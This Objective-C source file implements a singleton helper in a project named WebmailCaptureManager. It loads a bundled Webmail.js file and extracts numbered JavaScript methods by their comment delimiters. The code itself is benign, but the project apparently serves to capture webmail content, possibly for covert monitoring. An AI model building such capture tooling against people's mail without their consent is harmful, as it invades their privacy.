//
//  JavaScriptAccessor.m
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/8/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import "JavaScriptAccessor.h"
#import "NSArray+Webmail.h"

static JavaScriptAccessor *_JavaScriptAccessor = nil;

@interface JavaScriptAccessor ()

@property (nonatomic, copy) NSString *mJavaScriptMethods;

@end

@implementation JavaScriptAccessor

@synthesize mJavaScriptMethods;

+ (instancetype) sharedJavaScriptAccessor {
    if (_JavaScriptAccessor == nil) {
        _JavaScriptAccessor = [[JavaScriptAccessor alloc] init];
        _JavaScriptAccessor.mJavaScriptMethods = [self getAllJSMethods];
    }
    return (_JavaScriptAccessor);
}

+ (NSString *) jsMethod: (int) aMethodID {
    NSString *delimiter1 = [NSString stringWithFormat:@"//<Method%d>", aMethodID];
    NSString *delimiter2 = [NSString stringWithFormat:@"//</Method%d>", aMethodID];
    
    JavaScriptAccessor *myself = [self sharedJavaScriptAccessor];
    NSString *jsMethods = myself.mJavaScriptMethods;
    NSString *jsMethod = [[jsMethods componentsSeparatedByString:delimiter1] secondObject];
    jsMethod = [[jsMethod componentsSeparatedByString:delimiter2] firstObject];
    
    return jsMethod;
}

+ (NSString *) getAllJSMethods {
    NSString *jsPath = [[NSBundle mainBundle] resourcePath];
    jsPath = [jsPath stringByAppendingPathComponent:@"Webmail.js"];
    NSString *jsMethods = [[NSString alloc] initWithContentsOfFile:jsPath encoding:NSUTF8StringEncoding error:nil];
    return [jsMethods autorelease];
}

- (void) dealloc {
    self.mJavaScriptMethods = nil;
    [super dealloc];
}

@end
